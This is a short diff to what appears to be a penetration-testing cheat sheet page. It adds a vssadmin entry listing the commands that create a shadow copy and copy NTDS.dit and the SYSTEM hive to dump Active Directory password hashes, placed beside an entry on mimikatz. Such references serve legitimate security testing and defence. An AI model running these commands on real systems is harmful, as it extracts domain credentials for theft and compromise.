@@ -1778,6 +1778,16 @@ layout: default
         </ul>
     </ul>
 
+    <li>vssadmin</li>
+    <ul>
+        <li>Dump ntds.dit</li>
+        <ul>
+            <li>vssadmin create shadow /for=C:</li>
+            <li>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy</li>
+            <li>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy</li>
+        </ul>
+    </ul>
+
     <li>mimikatz</li>
     <ul>
         <li>Extracts hashes from the Local Security Authority Subsystem (LSASS)</li>
